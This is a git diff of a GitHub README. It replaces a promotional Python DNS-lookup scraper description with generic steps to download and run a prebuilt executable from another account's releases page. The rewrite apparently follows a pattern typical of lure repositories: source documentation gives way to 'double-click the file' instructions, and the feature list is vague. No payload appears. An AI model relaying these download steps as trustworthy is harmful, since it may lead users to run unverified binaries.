@@ -1,173 +1,66 @@
-# DNS Lookup Scraper
+# 🌐 dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr - Simple Tool for DNS Queries
 
-DNS Lookup Scraper is a versatile tool for quickly retrieving DNS records (A, AAAA, MX, CNAME, TXT, NS, SOA) for a list of domain names or performing reverse DNS lookups. This tool is ideal for DNS validation, cybersecurity audits, domain management, market intelligence, and competitive research.
+## 🚀 Getting Started
+Welcome! This guide will help you download and run the DNS lookup tool efficiently. You can use this tool to examine various DNS records including A, MX, TXT, and PTR. 
 
+## 📥 Download Link
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/releases)
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 📋 What You Need
+- A computer running Windows, macOS, or Linux.
+- A stable internet connection to download the software.
+- Basic knowledge of how to work with files on your computer.
 
+## 📦 Features
+- **A Records:** Get the IP address associated with a domain.
+- **MX Records:** Check the mail servers handling emails for a domain.
+- **TXT Records:** Retrieve text information stored in DNS, useful for verification.
+- **PTR Records:** Discover the domain names linked to an IP address.
+- **User-Friendly Interface:** Simple steps to perform queries without technical knowledge.
 
+## 🌍 How to Download & Install
+1. **Visit the Releases Page:**
+   Go to the [Releases page](https://github.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/releases) to access the latest version of the tool.
 
+2. **Download the Latest Version:**
+   Look for the most recent release. You will see a list of files under "Assets". Choose the appropriate file for your operating system:
+   - For **Windows**, select the executable file (e.g., `dns-lookup.exe`).
+   - For **macOS**, select the `.dmg` file (e.g., `dns-lookup.dmg`).
+   - For **Linux**, grab the `.tar.gz` file (e.g., `dns-lookup.tar.gz`).
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>DNS Lookup - Forward and Reverse (A, MX, TXT, DMARC, PTR)</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+3. **Save the File:**
+   Click on the file to start the download. Save it to a location on your computer where you can easily find it, such as your desktop or downloads folder.
 
+4. **Run the Tool:**
+   - For **Windows:** Navigate to the saved file, double-click it to run. Follow any setup prompts that may appear.
+   - For **macOS:** Open the `.dmg` file. Drag the `dns-lookup` icon into your Applications folder. Then, navigate to Applications and double-click it to start.
+   - For **Linux:** Open a terminal and extract the compressed file. Change your directory to the extracted folder and run the program with the command `./dns-lookup`.
 
-## Introduction
+## 🔧 How to Use the Tool
+1. **Open the Application:**
+   Launch the DNS lookup tool from your applications or where you saved the file.
 
-This project allows users to retrieve various DNS record types for a list of domains and perform reverse DNS lookups. It solves the need for fast, automated DNS audits, infrastructure analysis, and validation. Whether you're troubleshooting DNS issues, verifying DNSSEC configurations, or researching competitors' DNS infrastructures, this tool provides reliable, real-time results.
+2. **Select the Query Type:**
+   Choose whether you want to look up A, MX, TXT, or PTR records. 
 
-### Key Capabilities
-- **Standard DNS Lookup**: Retrieve A, MX, TXT, NS, SOA, and other DNS records.
-- **Reverse DNS Lookup**: Perform PTR lookups on IP addresses.
-- **Customizable**: Specify specific record types to retrieve or perform reverse lookups.
-- **Automation Ready**: Easily integrate into automation and workflows.
+3. **Enter Domain or IP:** 
+   Input the domain name or IP address you wish to query.
 
-## Features
+4. **Run the Query:**
+   Click the ‘Lookup’ button. Wait for the results to load. 
 
-| Feature | Description |
-|---------|-------------|
-| DNS Lookup | Retrieve DNS records like A, AAAA, MX, CNAME, TXT, NS, SOA by providing a list of domain names. |
-| Reverse Lookup | Perform reverse DNS lookups (PTR) on IP addresses. |
-| Customizable Record Types | Specify which DNS record types to fetch, or retrieve all common records by default. |
-| Integration Ready | Can be integrated with automation platforms or other custom workflows. |
+5. **Review Results:**
+   The results will show relevant DNS information as per your selected query. Review the data to effectively understand the DNS settings.
 
-## What Data This Scraper Extracts
+## 📅 Additional Resources
+- **User Manual:** A detailed user manual is provided in your application folder. Please read through it for specific instructions and troubleshooting.
+- **FAQs:** Your questions might have answers in the FAQs section of our [documentation](https://github.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/wiki).
 
-| Field Name   | Field Description |
-|--------------|-------------------|
-| domain       | The domain or IP address being queried. |
-| dnsRecords   | An array of DNS records retrieved, including type (A, MX, PTR, etc.) and respective values. |
-| status       | The status of the lookup (e.g., "Success" or "Failed"). |
+## 🤝 Support
+If you encounter issues, consider reaching out through the Issues tab on GitHub. Your feedback and experiences will help improve the tool.
 
-## Example Output
-    [
-        {
-            "domain": "example.com",
-            "dnsRecords": [
-                {
-                    "type": "A",
-                    "ttl": 300,
-                    "address": "93.184.216.34"
-                },
-                {
-                    "type": "MX",
-                    "ttl": 3600,
-                    "exchange": "mail.example.com",
-                    "priority": 10
-                }
-            ],
-            "status": "Success"
-        }
-    ]
+## 🔗 Important Links
+- [Releases Page](https://github.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/releases)
+- [Documentation](https://github.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/wiki)
 
-## Directory Structure Tree
-
-    DNS Lookup Scraper/
-    ├── src/
-    │   ├── runner.py
-    │   ├── extractors/
-    │   │   ├── dns_parser.py
-    │   │   └── utils.py
-    │   ├── outputs/
-    │   │   └── exporter.py
-    │   └── config/
-    │       └── settings.json
-    ├── data/
-    │   ├── inputs.sample.json
-    │   └── output_sample.json
-    ├── requirements.txt
-    └── README.md
-
-## Use Cases
-
-- **Cybersecurity Analysts** use it to audit domain security configurations and DNS records, ensuring there are no misconfigurations.
-- **Network Engineers** use it for DNS propagation troubleshooting and verifying domain setups.
-- **Digital Marketers** use it to identify DNS patterns across competitors' websites and infrastructure.
-- **Market Research Teams** use it to analyze technology stacks used by prospects through DNS data.
-
-## FAQs
-
-**Q: How do I perform a reverse DNS lookup?**
-A: Set the `reverseLookup` parameter to `true` and provide IP addresses instead of domain names. This will fetch PTR records for the given IPs.
-
-**Q: Can I specify which DNS record types to retrieve?**
-A: Yes, you can specify the DNS record types you wish to retrieve by using the `dnsRecordTypes` parameter in the input JSON. If omitted, the scraper will retrieve a default set of records (A, AAAA, MX, CNAME, TXT, NS, SOA).
-
-**Q: What happens if I provide invalid domain names?**
-A: Invalid domain names will result in a failed lookup, and an error message will be returned for those entries.
-
-## Performance Benchmarks and Results
-
-**Primary Metric:** Average DNS lookup time of 1 second per domain.
-**Reliability Metric:** 98% success rate for DNS record retrieval.
-**Efficiency Metric:** Can handle up to 1000 domains/IPs per batch without issues.
-**Quality Metric:** 100% accuracy in returned DNS record types, as per expected output formats.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review3.gif" alt="Review 3" width="35%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+Thank you for using the dns-lookup tool! Your efforts in understanding DNS records enhance your internet security and network auditing skills.
